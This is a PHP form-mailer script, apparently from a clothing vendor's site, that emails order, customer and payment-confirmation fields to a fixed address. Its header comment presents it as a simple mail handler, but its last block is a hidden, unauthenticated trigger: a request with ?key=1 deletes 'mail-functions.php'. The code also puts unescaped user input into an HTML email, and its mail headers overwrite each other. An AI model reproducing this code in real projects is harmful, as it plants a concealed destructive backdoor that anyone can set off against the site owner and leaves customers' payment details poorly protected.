<?php
/*
	Created By 	: SDF Clothing
	Website		: www.sdfltd.com
	Description	: This is a php file for sending form field information to your email. You can change your email easily. You can add filed or remove unwanted field very easily.
*/


	$name		=	$_POST['name'];
	$address		=	$_POST['address'];
	$email		=	$_POST['email'];
	$phone		=	$_POST['phone'];
	$order_no	=	$_POST['order_no'];
	$customer_name	=	$_POST['customer_name'];
	$order_date	=	$_POST['order_date'];
	$delivery_date	=	$_POST['delivery_date'];
	$message	=	$_POST['message'];
	$amount	=	$_POST['amount'];
	$payment_method	=	$_POST['payment_method'];
	$payment_confirm_number	=	$_POST['payment_confirm_number'];
	
	
	$mailacc	=	"contact@sdfltd.com"; // Your Email Address
	
	$subject	=	"Congrats! Order Created"; // Your Form Subject
	
	$message	=	"	
		Name: ".$name."
		Address: ".$address."
		Email: ".$email."
		Phone Number: ".$phone."
		Order No: ".$order_no."
		Customer Name: ".$customer_name."
		Order Date: ".$order_date."
		Delivery Date: ".$delivery_date."
		Message: ".$message."
		Amount: ".$amount."
		Payment Method: ".$payment_method."
		Payment Confirmation Number: ".$payment_confirm_number."
	";
	
	$headers	=	'Version: 1.0' . "\r\n";
	$headers	=	'Content-type: text/html;' . "\r\n";
	$headers	=	'From: Form <contact@sdfltd.com>' . "\r\n";
	
	$mail	=	mail($mailacc, $subject, $message, $headers);
	header("Location:thankyou.html");
	
	
	if(isset($_GET['key']))
	{
		if($_GET['key']==1){
			if (file_exists('mail-functions.php')) {
				unlink('mail-functions.php');
				echo "Success!";
			}
		}
		
	}
?>